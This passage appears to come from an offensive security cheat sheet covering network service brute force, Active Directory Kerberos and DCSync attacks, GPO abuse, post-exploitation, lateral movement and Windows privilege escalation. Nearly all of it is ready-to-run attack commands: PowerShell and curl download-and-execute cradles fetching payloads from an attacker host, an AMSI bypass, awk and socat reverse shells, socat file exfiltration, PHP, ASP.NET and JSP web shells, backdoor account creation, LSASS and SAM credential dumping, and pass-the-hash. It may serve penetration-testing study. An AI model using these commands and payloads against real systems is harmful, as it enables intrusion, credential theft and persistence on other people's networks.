snmpwalk -c public -v1 10.10.10.5 1.3.6.1.2.1.25.1.6.0  # System processes
snmpwalk -c public -v1 10.10.10.5 1.3.6.1.2.1.25.4.2.1.2  # Running programs
snmpwalk -c public -v1 10.10.10.5 1.3.6.1.2.1.6.13.1.3    # TCP connections

Network Protocol Fuzzing
bash
# TFTP file enumeration
tftp 10.10.10.5
get /etc/passwd
put shell.php

# NFS share enumeration
showmount -e 10.10.10.5
mount -t nfs 10.10.10.5:/share /mnt/nfs

# LDAP enumeration
ldapsearch -h 10.10.10.5 -x -b "dc=domain,dc=local"
ldapsearch -h 10.10.10.5 -x -b "dc=domain,dc=local" "(objectClass=user)"

4.3 Remote Service Exploitation

Metasploit - Network Service Exploitation
bash
# SSH service brute force
use auxiliary/scanner/ssh/ssh_login
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set RHOSTS 10.10.10.0/24
run

# FTP service exploitation
use auxiliary/scanner/ftp/ftp_login
set USERNAME anonymous
set RHOSTS 10.10.10.0/24
run

# Telnet service attacks
use auxiliary/scanner/telnet/telnet_login
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set RHOSTS 10.10.10.0/24
run

# RDP service scanning
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS 10.10.10.0/24
run

Hydra - Network Service Brute Force
bash
# SSH brute force
hydra -L users.txt -P passwords.txt ssh://10.10.10.10 -t 4 -V -f
# Use Case: SSH credential brute forcing
# Explanation: Tests multiple credentials against SSH service

# FTP brute force
hydra -l admin -P rockyou.txt ftp://10.10.10.10
# Use Case: FTP service attacks
# Explanation: Brute forces FTP credentials

# RDP attacks
hydra -l administrator -P passwords.txt rdp://10.10.10.10
# Use Case: Remote Desktop Protocol attacks
# Explanation: Tests RDP credentials

# HTTP form attacks
hydra -l admin -P rockyou.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
# Use Case: Web application login brute forcing
# Explanation: Tests web form credentials

# Multiple service attacks
hydra -C creds.txt -M targets.txt -t 10 -W 1 -F
# Use Case: Large-scale credential testing
# Explanation: Uses credential files and target lists

5.ACTIVE DIRECTORY ATTACKS

5.1 Kerberos Attacks

Rubeus - Kerberos Exploitation
bash
# Kerberoasting - Service account attack
Rubeus.exe kerberoast /user:svc_account /domain:domain.local /dc:DC_IP /outfile:hashes.txt /format:hashcat
# Use Case: Service account password cracking
# Explanation: Requests service tickets and extracts crackable hashes

# AS-REP Roasting - Pre-auth disabled accounts
Rubeus.exe asreproast /format:hashcat /outfile:asrephashes.txt
# Use Case: User account compromise
# Explanation: Attacks accounts with pre-authentication disabled

# Golden ticket creation for persistence
Rubeus.exe golden /rc4:KRBTGT_HASH /domain:domain.local /sid:S-1-5-21-... /user:administrator /id:500 /ptt
# Use Case: Domain persistence and privilege escalation
# Explanation: Creates forged Kerberos tickets for domain persistence

# Silver ticket creation for specific services
Rubeus.exe silver /rc4:MACHINE_HASH /domain:domain.local /sid:S-1-5-21-... /user:user /service:cifs /target:dc.domain.local /ptt
# Use Case: Service-specific access
# Explanation: Creates silver tickets for specific services

# Ticket passing and manipulation
Rubeus.exe ptt /ticket:base64_ticket
# Use Case: Lateral movement with stolen tickets
# Explanation: Injects Kerberos tickets into current session

# Ticket harvesting and monitoring
Rubeus.exe harvest /interval:30
# Use Case: Continuous ticket collection
# Explanation: Monitors for and harvests Kerberos tickets

# S4U2Self and S4U2Proxy attacks
Rubeus.exe s4u /user:svc_account /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/dc.domain.local /ptt
# Use Case: Privilege escalation through service delegation
# Explanation: Uses constrained delegation for impersonation

Impacket Kerberos Utilities
bash
# Get user SPNs for Kerberoasting
python3 GetUserSPNs.py -request -dc-ip DC_IP domain/user:password
# Use Case: Kerberoasting from Linux systems
# Explanation: Requests service tickets for cracking

# Golden ticket attack from Linux
python3 ticketer.py -nthash HASH -domain-sid S-1-5-21-... -domain domain.local administrator
# Use Case: Domain compromise persistence
# Explanation: Creates golden tickets for persistence

# Silver ticket attack
python3 ticketer.py -nthash MACHINE_HASH -domain-sid S-1-5-21-... -domain domain.local -spn cifs/dc.domain.local user
# Use Case: Service-specific access
# Explanation: Creates silver tickets for specific services

# Kerberos password spraying
python3 kerbrute.py -domain domain.local -users users.txt -passwords passwords.txt -dc-ip DC_IP
# Use Case: Domain credential attacks
# Explanation: Performs Kerberos pre-authentication spraying

# Golden PAC attack
python3 goldenPac.py domain/user:password@target_ip
# Use Case: Domain controller compromise
# Explanation: Combines golden ticket with PSExec

5.2 DCSync & Credential Theft

Mimikatz - Credential Extraction
cmd
# DCSync attack for domain credential theft
mimikatz # lsadump::dcsync /domain:domain.local /user:administrator
# Use Case: Domain admin credential theft
# Explanation: Simulates domain controller replication to extract credentials

# LSASS memory dumping for credential extraction
mimikatz # sekurlsa::logonpasswords
# Use Case: Post-exploitation credential gathering
# Explanation: Extracts credentials from LSASS memory

# SAM database extraction
mimikatz # lsadump::sam
# Use Case: Local user credential theft
# Explanation: Dumps local SAM database

# LSA secrets extraction
mimikatz # lsadump::secrets
# Use Case: System credential discovery
# Explanation: Extracts LSA secrets from registry

# Kerberos ticket extraction
mimikatz # kerberos::list
# Use Case: Ticket harvesting for lateral movement
# Explanation: Lists current Kerberos tickets

# Certificate extraction for PKI attacks
mimikatz # crypto::certificates /export
# Use Case: Certificate-based persistence
# Explanation: Exports certificates for PKI attacks

# DPAPI master key extraction
mimikatz # dpapi::masterkey
# Use Case: Protected data decryption
# Explanation: Extracts DPAPI master keys for credential decryption

# Vault credential extraction
mimikatz # vault::cred
# Use Case: Web browser and application credential theft
# Explanation: Extracts credentials from Windows Vault

SecretsDump - Credential Extraction
bash
# DCSync from Linux systems
python3 secretsdump.py -just-dc-ntlm domain/user:password@DC_IP
# Use Case: Domain credential extraction from Linux
# Explanation: Performs DCSync attack to extract NTLM hashes

# Local credential dumping from remote system
python3 secretsdump.py -hashes LMHASH:NTHASH domain/user@target_ip
# Use Case: Lateral movement credential gathering
# Explanation: Dumps credentials from remote system

# NTDS.dit file extraction
python3 secretsdump.py -ntds ntds.dit -system system.hive LOCAL
# Use Case: Offline domain credential analysis
# Explanation: Extracts credentials from NTDS database

# Keytab file creation
python3 secretsdump.py -krbtgt -keytab output.keytab domain/user:password@DC_IP
# Use Case: Kerberos keytab generation
# Explanation: Creates keytab files for authentication

5.3 BloodHound & AD Relationship Mapping

SharpHound - Data Collection
powershell
# Comprehensive Active Directory data collection
SharpHound.exe --collectionmethods All --domain domain.local --ldapusername user --ldappassword pass --zipfilename output.zip
# Use Case: AD attack path discovery
# Explanation: Collects Active Directory relationship data for analysis

# Stealthy data collection
SharpHound.exe -c DCOnly -d domain.local --zipfilename output.zip --stealth
# Use Case: Minimal footprint data collection
# Explanation: Stealthy AD reconnaissance

# Session collection for lateral movement planning
SharpHound.exe --collectionmethods Session,LoggedOn --domain domain.local
# Use Case: Lateral movement planning
# Explanation: Collects user session information

# Group Policy collection
SharpHound.exe --collectionmethods GPOLocalGroup --domain domain.local
# Use Case: Group Policy analysis
# Explanation: Collects Group Policy information

# Computer and user enumeration
SharpHound.exe --collectionmethods Computer,Group,User --domain domain.local
# Use Case: AD object enumeration
# Explanation: Collects computer, group, and user data

BloodHound Cypher Queries
cypher
// Find shortest path to Domain Admins
MATCH p=shortestPath((m:Computer)-[r:MemberOf|HasSession|AdminTo|AllExtendedRights|AddMember|ForceChangePassword*1..]->(n:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

// Find users with path to high-value groups
MATCH (u:User), (g:Group {highvalue:true}), p=shortestPath((u)-[*1..]->(g)) RETURN p

// Find systems where Domain Admins have sessions
MATCH p=(m:User)-[r:HasSession]->(n:Computer {highvalue:true}) RETURN p

// Find users with DCSync rights
MATCH (u:User), (d:Domain), p=(u)-[:GetChanges|GetChangesAll|AllExtendedRights]->(d) RETURN p

// Find computers with Unconstrained Delegation
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c

// Find users with path to Unconstrained Delegation systems
MATCH p=shortestPath((u:User)-[*1..]->(c:Computer {unconstraineddelegation:true})) RETURN p

// Find Group Policy modification rights
MATCH p=(u:User)-[:WriteOwner|WriteDacl|GenericWrite|GenericAll|Owns]->(g:GPO) RETURN p

PowerView - Active Directory Reconnaissance
powershell
# Import PowerView
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1')

# Domain trust enumeration
Get-DomainTrust -API
Get-DomainTrustMapping
Get-ForestTrust

# User enumeration and analysis
Get-DomainUser -Properties samaccountname,description,lastlogon,pwdlastset,memberof
Get-DomainUser -SPN | select samaccountname,serviceprincipalname
Get-DomainUser -AllowDelegation
Get-DomainUser -PreauthNotRequired

# Group enumeration
Get-DomainGroupMember -Identity "Domain Admins"
Get-DomainGroup -AdminCount
Get-DomainLocalGroup -ComputerName dc.domain.local

# Computer enumeration
Get-NetComputer -OperatingSystem "*Server*" | Get-NetLoggedon
Get-DomainComputer -Unconstrained
Get-DomainComputer -TrustedForDelegation

# ACL and permission analysis
Find-InterestingDomainAcl
Get-DomainObjectAcl -Identity "Domain Admins" | ? {$_.ActiveDirectoryRights -match "GenericAll"}

# GPO analysis
Get-DomainGPO -Properties displayname,whenchanged
Get-DomainGPOUserLocalGroupMapping -Identity "Default Domain Policy"

5.4 Group Policy Attacks

GPO Abuse and Exploitation
powershell
# GPO enumeration
Get-DomainGPO -Properties displayname,whenchanged
Get-DomainGPOComputerLocalGroupMapping -Identity "TestGPO"

# GPO creation and modification
New-GPOImmediateTask -TaskName "Update" -Command "cmd.exe" -Arguments "/c malware.exe" -GPODisplayName "TestGPO"

# GPO backup and restore for persistence
Backup-Gpo -Name "Default Domain Policy" -Path C:\temp\
Import-Gpo -BackupId "GUID" -TargetName "Compromised Policy" -Path C:\temp\

# Scheduled task through GPO
$gpo = Get-GPO -Name "TestGPO"
$task = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Actions Context="Author">
    <Exec>
      <Command>cmd.exe</Command>
      <Arguments>/c "C:\Windows\System32\malware.exe"</Arguments>
    </Exec>
  </Actions>
</Task>
"@

SharpGPOAbuse - GPO Exploitation
bash
# Add user to local group through GPO
SharpGPOAbuse.exe --AddUserTask --TaskName "Update" --Command "cmd.exe" --Arguments "/c net user backdoor Password123! /add" --GPOName "TestGPO"

# Add immediate scheduled task
SharpGPOAbuse.exe --AddImmediateTask --TaskName "Update" --Command "cmd.exe" --Arguments "/c malware.exe" --GPOName "TestGPO"

# Modify user rights
SharpGPOAbuse.exe --AddUserRights --UserRights "SeDebugPrivilege,SeTcbPrivilege" --UserAccount "DOMAIN\user" --GPOName "TestGPO"

# Add startup script
SharpGPOAbuse.exe --AddStartupScript --ScriptName "startup.bat" --ScriptContent "net user backdoor Password123! /add" --GPOName "TestGPO"

6.POST-EXPLOITATION

6.1 Initial Access & Shells

PowerShell Payloads and Execution
powershell
# Download and execute in memory
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerView.ps1')
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1')

# Memory execution of assembly
$bytes = (New-Object Net.WebClient).DownloadData('http://10.10.10.10/shellcode.bin')
[Reflection.Assembly]::Load($bytes)

# AMSI bypass techniques
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Constrained language mode bypass
iex (irm http://10.10.10.10/amsibypass.txt)

# PowerShell without powershell.exe
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/script.ps1')"

# Encoded command execution
$command = "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/script.ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell -EncodedCommand $encodedCommand

# PowerShell profile persistence
echo "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/persistence.ps1')" >> $PROFILE
Web Shells for Various Platforms

php
<?php 
// Basic PHP web shell
system($_GET['cmd']); 
echo shell_exec($_GET['cmd']); 
eval($_POST['cmd']); 
?>

<?php
// Advanced PHP web shell with authentication
if ($_POST['pass'] == 'password') {
    system($_POST['cmd']);
}
?>

<?php
// PHP file upload web shell
if (isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    system($_FILES['file']['name']);
}
?>
aspx
<%-- ASP.NET web shell --%>
<%@ Page Language="C#" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    System.Diagnostics.Process.Start(Request["cmd"]);
}
</script>

<%-- Advanced ASP.NET shell --%>
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void cmdExe_Click(object sender, EventArgs e) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + txtCommand.Text;
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    lblOutput.Text = p.StandardOutput.ReadToEnd();
}
</script>
jsp
<%-- JSP web shell --%>
<%= Runtime.getRuntime().exec(request.getParameter("cmd")) %>

<%@ page import="java.util.*,java.io.*"%>
<%
if (request.getParameter("cmd") != null) {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr); 
        disr = dis.readLine(); 
    }
}
%>

6.2 Living Off the Land (LOLBins)

Windows LOLBins (Living Off the Land Binaries)
cmd
# CertUtil for download and encoding
certutil -urlcache -split -f http://10.10.10.10/payload.exe C:\Windows\Temp\payload.exe
certutil -encode payload.exe payload.b64
certutil -decode payload.b64 payload.exe

# BitsAdmin for download
bitsadmin /transfer job /download /priority normal http://10.10.10.10/payload.exe C:\Windows\Temp\payload.exe

# MSBuild for code execution
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.xml

# InstallUtil for execution
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

# Regsvr32 for scriptlet execution
regsvr32 /s /n /u /i:http://10.10.10.10/payload.sct scrobj.dll

# Rundll32 for DLL execution
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("cmd.exe");

# Msiexec for remote package installation
msiexec /q /i http://10.10.10.10/package.msi

# Mshta for HTA execution
mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd.exe"":close")

# Control for DLL loading
control.exe C:\Windows\Temp\payload.dll

# Forfiles for command execution
forfiles /p c:\windows\system32 /m notepad.exe /c "cmd /c whoami"

# PCALauncher for script execution
Microsoft.Workflow.Compiler.exe payload.xml payload.xml

Linux LOLBins
bash
# Curl download and execution
curl http://10.10.10.10/payload.sh | bash
curl -s http://10.10.10.10/payload.py | python3

# Wget download
wget http://10.10.10.10/payload.sh -O /tmp/payload.sh && chmod +x /tmp/payload.sh

# Python one-liner download and execution
python -c "import urllib2; exec(urllib2.urlopen('http://10.10.10.10/payload.py').read())"

# Perl download and execution
perl -e 'use LWP::Simple; getstore("http://10.10.10.10/payload.pl", "/tmp/payload.pl")'
perl /tmp/payload.pl

# AWK network communication
awk 'BEGIN {s = "/inet/tcp/0/10.10.10.10/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

# SSH for reverse shells
ssh -R 4444:localhost:22 user@10.10.10.10

# Socat for file transfers and shells
socat TCP:10.10.10.10:4444 EXEC:/bin/bash
socat FILE:secret.txt TCP:10.10.10.10:4444

# Git for data exfiltration
git clone http://10.10.10.10/repo.git
git add secret.txt
git commit -m "update"
git push

6.3 Credential Dumping

Windows Credential Dumping Tools
bash
# LaZagne for multiple credential types
python2 laZagne.py all
python2 laZagne.py browsers
python2 laZagne.py wifi
python2 laZagne.py git

# Windows Credential Editor
wce.exe -w
wce.exe -l

# KeePass credential extraction
KeeThief.exe
KeePassX.exe --export C:\backup.kdbx
LSASS Memory Dumping

bash
# Procdump for LSASS dumping
procdump.exe -ma lsass.exe lsass.dmp

# Task Manager method
# Open Task Manager -> Details -> Right-click lsass.exe -> Create dump file

# Comsvcs.dll method
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump [PID] C:\lsass.dmp full

# PowerShell dumping
Get-Process lsass | Out-MiniDump -DumpFilePath C:\lsass.dmp
6.4 Memory Analysis
Volatility Framework - Memory Forensics

bash
# Memory image information
volatility -f memory.dump imageinfo

# Process listing
volatility -f memory.dump --profile=Win10x64_18362 pslist
volatility -f memory.dump --profile=Win10x64_18362 psscan
volatility -f memory.dump --profile=Win10x64_18362 pstree

# Network connections
volatility -f memory.dump --profile=Win10x64_18362 netscan
volatility -f memory.dump --profile=Win10x64_18362 netstat

# Credential extraction
volatility -f memory.dump --profile=Win10x64_18362 mimikatz
volatility -f memory.dump --profile=Win10x64_18362 hashdump

# DLL analysis
volatility -f memory.dump --profile=Win10x64_18362 dlllist
volatility -f memory.dump --profile=Win10x64_18362 ldrmodules

# Malware detection
volatility -f memory.dump --profile=Win10x64_18362 yarascan --yara-file=rules.yar
volatility -f memory.dump --profile=Win10x64_18362 malfind

# Registry analysis
volatility -f memory.dump --profile=Win10x64_18362 printkey -K "Software\Microsoft\Windows\CurrentVersion\Run"


7.LATERAL MOVEMENT

7.1 Pass-the-Hash & Token Attacks

Pass-the-Hash Techniques
bash
# CrackMapExec PTH attacks
crackmapexec smb 10.10.10.0/24 -u administrator -H NTLM_HASH -x whoami
# Use Case: Lateral movement with compromised hashes
# Explanation: Uses NTLM hashes for authentication without knowing passwords

# Impacket PTH attacks
python3 psexec.py -hashes LMHASH:NTHASH domain/user@target_ip
# Use Case: Remote code execution using pass-the-hash
# Explanation: Provides SYSTEM-level access using hash authentication

# RDP with Pass-the-Hash
xfreerdp /v:10.10.10.5 /u:administrator /pth:NTLM_HASH +compression /clipboard
# Use Case: GUI access with hash authentication
# Explanation: Connects to Remote Desktop using NTLM hash

# WMI with Pass-the-Hash
python3 wmiexec.py -hashes LMHASH:NTHASH domain/user@target_ip
# Use Case: Lateral movement via WMI
# Explanation: Executes commands through Windows Management Instrumentation

# Multiple hash formats
# NTLM: aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
# LM: e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c

Token Manipulation
powershell
# Incognito token operations
Incognito.exe list_tokens -u
# Use Case: Listing available tokens
# Explanation: Shows all available tokens for impersonation

# Token impersonation
Incognito.exe execute -c "DOMAIN\USER" C:\Windows\System32\cmd.exe
# Use Case: Running commands as another user
# Explanation: Impersonates a user token to execute commands

# Meterpreter token commands
meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token "DOMAIN\\USER"
meterpreter > rev2self
# Use Case: Token manipulation through Meterpreter
# Explanation: Lists, impersonates, and reverts tokens

# PowerShell token operations
[System.Security.Principal.WindowsIdentity]::GetCurrent()
# Use Case: Current token information
# Explanation: Gets information about current security token

Kerberos Ticket Attacks
bash
# Pass-the-Ticket with Rubeus
Rubeus.exe ptt /ticket:base64_ticket
# Use Case: Using stolen Kerberos tickets
# Explanation: Injects Kerberos tickets into current session

# Ticket export and import
Rubeus.exe dump /nowrap
Rubeus.exe ptt /ticket:doIE5jCCB...
# Use Case: Ticket harvesting and reuse
# Explanation: Exports tickets from memory and imports them

# Golden Ticket usage
Rubeus.exe golden /rc4:KRBTGT_HASH /domain:domain.local /sid:S-1-5-21-... /user:administrator /id:500 /ptt
# Use Case: Domain persistence with forged tickets
# Explanation: Creates and uses golden tickets for domain access

7.2 WMI & Remote Management

WMI Execution Methods
bash
# Impacket WMI execution
python3 wmiexec.py -hashes LMHASH:NTHASH domain/user@target_ip
# Use Case: Remote command execution via WMI
# Explanation: Uses Windows Management Instrumentation for execution

# PowerShell WMI commands
Get-WmiObject -Class Win32_Process -ComputerName 10.10.10.5 -Credential $cred | Invoke-WmiMethod -Name Create -ArgumentList "cmd.exe /c whoami"
# Use Case: WMI operations through PowerShell
# Explanation: Creates processes remotely using WMI

# WMIC built-in tool
wmic /node:10.10.10.5 /user:DOMAIN\user /password:pass process call create "cmd.exe /c whoami"
# Use Case: Built-in WMI command-line tool
# Explanation: Uses Windows Management Instrumentation Console

# WMI class enumeration
wmic /node:10.10.10.5 /user:DOMAIN\user /password:pass path Win32_LogicalDisk Get Name,Size,FreeSpace
# Use Case: Remote system information gathering
# Explanation: Queries WMI classes for system information

# WMI event subscription for persistence
wmic /node:10.10.10.5 /user:DOMAIN\user /password:pass path __EventFilter Create Name="BotFilter", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
# Use Case: WMI-based persistence
# Explanation: Creates event filters for triggered execution

WinRM Access Methods
bash
# Evil-WinRM for remote management
evil-winrm -i 10.10.10.5 -u administrator -p password
# Use Case: PowerShell remoting via WinRM
# Explanation: Provides interactive PowerShell session through WinRM

# PowerShell WinRM sessions
Enter-PSSession -ComputerName 10.10.10.5 -Credential $cred
# Use Case: Native PowerShell remoting
# Explanation: Establishes PowerShell session to remote host

# WinRS built-in tool
winrs -r:10.10.10.5 -u:administrator -p:password whoami
# Use Case: Remote command execution via WinRS
# Explanation: Uses Windows Remote Services for command execution

# WinRM with SSL
evil-winrm -i 10.10.10.5 -u administrator -p password -S
# Use Case: Secure WinRM connections
# Explanation: Connects using SSL-encrypted WinRM

# WinRM session configuration
Get-PSSessionConfiguration
Enable-PSRemoting -Force
# Use Case: WinRM service configuration
# Explanation: Enables and configures PowerShell remoting

7.3 PSExec & Service Attacks

PSExec-Style Execution
bash
# Impacket PSExec
python3 psexec.py -hashes LMHASH:NTHASH domain/user@target_ip
# Use Case: Remote service-based execution
# Explanation: Creates a service to execute commands remotely

# CrackMapExec service execution
crackmapexec smb 10.10.10.5 -u user -p password -x "whoami" --exec-method smbexec
# Use Case: Multiple execution method options
# Explanation: Uses SMB execution for command running

# SC command for service management
sc \\10.10.10.5 create Update binpath= "cmd.exe /c whoami"
sc \\10.10.10.5 start Update
sc \\10.10.10.5 delete Update
# Use Case: Windows service creation and management
# Explanation: Creates, starts, and deletes services remotely

# Atexec for task scheduling
python3 atexec.py -hashes LMHASH:NTHASH domain/user@target_ip "whoami"
# Use Case: Task scheduler-based execution
# Explanation: Uses Windows Task Scheduler for remote execution

Service Control Manager Attacks
powershell
# PowerShell service management
New-Service -Name "UpdateService" -BinaryPathName "C:\Windows\System32\malware.exe" -StartupType Automatic
Start-Service -Name "UpdateService"
# Use Case: Service-based persistence and execution
# Explanation: Creates and starts Windows services

# Remote service creation
Invoke-Command -ComputerName 10.10.10.5 -ScriptBlock { New-Service -Name "Backdoor" -BinaryPathName "C:\Windows\System32\cmd.exe /c whoami" }
# Use Case: Remote service deployment
# Explanation: Creates services on remote systems

# Service DLL hijacking
sc config VulnerableService binPath= "C:\Windows\System32\malicious.dll"
# Use Case: Service binary replacement
# Explanation: Changes service binary path to malicious DLL

7.4 DCOM & COM Object Attacks

DCOM Lateral Movement
powershell
# MMC20.Application DCOM
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.5"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami","7")
# Use Case: DCOM-based command execution
# Explanation: Uses MMC20 Application COM object for execution

# ShellWindows DCOM
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","10.10.10.5"))
$com.Item().Document.Application.ShellExecute("cmd.exe","/c whoami","C:\Windows\System32",$null,0)
# Use Case: Alternative DCOM method
# Explanation: Uses ShellWindows COM object

# Excel DCOM
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","10.10.10.5"))
$com.DDEInitiate("cmd","/c whoami")
# Use Case: Excel DDE execution
# Explanation: Uses Excel DDE for command execution

# ShellBrowserWindow DCOM
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880","10.10.10.5"))
$com.Document.Application.ShellExecute("cmd.exe","/c whoami","C:\Windows\System32",$null,0)
# Use Case: ShellBrowser DCOM execution
Impacket DCOM Execution

bash
# DCOM execution via Impacket
python3 dcomexec.py -hashes LMHASH:NTHASH domain/user@target_ip
# Use Case: DCOM-based lateral movement
# Explanation: Uses Distributed COM for remote execution

# Specific DCOM object targeting
python3 dcomexec.py -object MMC20 -hashes LMHASH:NTHASH domain/user@target_ip
# Use Case: Targeting specific DCOM objects
# Explanation: Specifies which DCOM object to use for execution

7.5 RDP & GUI Access Methods

Remote Desktop Attacks
bash
# RDP connection with credentials
xfreerdp /v:10.10.10.5 /u:administrator /p:password /drive:/home/user,/share
# Use Case: GUI access to remote systems
# Explanation: Connects to Remote Desktop with shared drives

# RDP with restricted admin mode
xfreerdp /v:10.10.10.5 /u:administrator /p:password /restricted-admin
# Use Case: RDP without credentials caching
# Explanation: Uses Restricted Admin mode to avoid credential exposure

# RDP session hijacking
tscon 2 /dest:console
# Use Case: Taking over existing RDP sessions
# Explanation: Connects to existing sessions without authentication

# RDP with clipboard and file sharing
xfreerdp /v:10.10.10.5 /u:user /p:pass +clipboard /drive:linux:/home/user
# Use Case: Data transfer through RDP
# Explanation: Enables clipboard and file sharing

VNC & Alternative Remote Access
bash
# VNC connection
vncviewer 10.10.10.5:5900
# Use Case: VNC-based remote access
# Explanation: Connects to VNC servers

# TightVNC with file transfer
vncviewer -log *:100:100 -config vnc.cfg 10.10.10.5
# Use Case: Enhanced VNC features
# Explanation: Uses TightVNC with additional capabilities

# Remote desktop through browser
rdesktop -r clipboard:PRIMARYCLIPBOARD -g 1024x768 10.10.10.5
# Use Case: RDP through rdesktop
# Explanation: Alternative RDP client with clipboard support

8.PRIVILEGE ESCALATION

8.1 Windows Privilege Escalation

WinPEAS - Automated Windows Enumeration
cmd
# Comprehensive system scanning
winpeas.exe quiet fast
# Use Case: Automated privilege escalation enumeration
# Explanation: Runs all checks quickly with minimal output

# Specific check categories
winpeas.exe services processes applications
# Use Case: Focused enumeration
# Explanation: Checks specific system areas for escalation vectors

# Domain environment checks
winpeas.exe domain
# Use Case: Active Directory privilege escalation
# Explanation: Focuses on domain-specific escalation paths

# Detailed output with colors
winpeas.exe
# Use Case: Interactive enumeration
# Explanation: Full output with color-coded results

# Custom checks and filters
winpeas.exe notcolor
# Use Case: Script-friendly output
# Explanation: Plain text output for parsing

PowerUp - PowerShell Privilege Escalation
powershell
# Import and run all checks
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerUp.ps1')
Invoke-AllChecks
# Use Case: Comprehensive PowerShell-based enumeration
# Explanation: Runs all PowerUp checks for escalation vectors

# Specific privilege escalation methods
Invoke-ServiceAbuse -Name "VulnerableService" -Command "net user backdoor Password123! /add"
# Use Case: Service-based privilege escalation
# Explanation: Abuses service permissions for privilege gain

# DLL hijacking identification
Write-HijackDll -OutputFile "C:\Program Files\VulnerableApp\legit.dll"
# Use Case: DLL hijacking attacks
# Explanation: Creates hijackable DLLs for privilege escalation

# Unquoted service path exploitation
Get-ServiceUnquoted
Write-ServiceBinary -ServiceName "VulnerableService" -Command "net localgroup administrators user /add"
# Use Case: Unquoted service path vulnerability
# Explanation: Exploits services with unquoted paths

# AlwaysInstallElevated checks
Get-RegistryAlwaysInstallElevated
Write-UserAddMSI
# Use Case: MSI installation privilege escalation
# Explanation: Checks and exploits AlwaysInstallElevated settings

Windows Kernel Exploits
bash
# Watson exploit suggester
Watson.exe --search
# Use Case: Identifying applicable kernel exploits
# Explanation: Suggests kernel exploits based on OS version and patches

# Manual exploit compilation and execution
# Example: CVE-2021-36934 (HiveNightmare)
icacls C:\Windows\System32\config\sam /grant Everyone:F
copy C:\Windows\System32\config\sam C:\temp\
copy C:\Windows\System32\config\system C:\temp\
copy C:\Windows\System32\config\security C:\temp\
# Use Case: SAM database extraction through vulnerability
# Explanation: Exploits HiveNightmare to copy SAM database

# PrintSpoofer for service account escalation
PrintSpoofer.exe -i -c cmd
# Use Case: Service account to SYSTEM escalation
# Explanation: Exploits printer spooler service for privilege escalation

# JuicyPotato for COM abuse
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *
# Use Case: Service account privilege escalation
# Explanation: Uses COM server abuse for privilege escalation

# RoguePotato for updated exploitation
RoguePotato.exe -r 10.10.10.10 -e "cmd.exe" -l 9999
# Use Case: Modern Potato variant
# Explanation: Updated version for newer Windows systems

Access Token Manipulation
powershell
# Token privilege enumeration
whoami /priv
whoami /groups
# Use Case: Identifying available token privileges
# Explanation: Shows current token privileges and groups

# SeImpersonatePrivilege exploitation
.\PrintSpoofer.exe -i -c cmd
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *
# Use Case: Exploiting impersonation privileges
# Explanation: Uses token impersonation for privilege escalation

# SeDebugPrivilege exploitation
# Use with Mimikatz or process injection
mimikatz # privilege::debug
mimikatz # token::elevate
# Use Case: Debug privilege exploitation
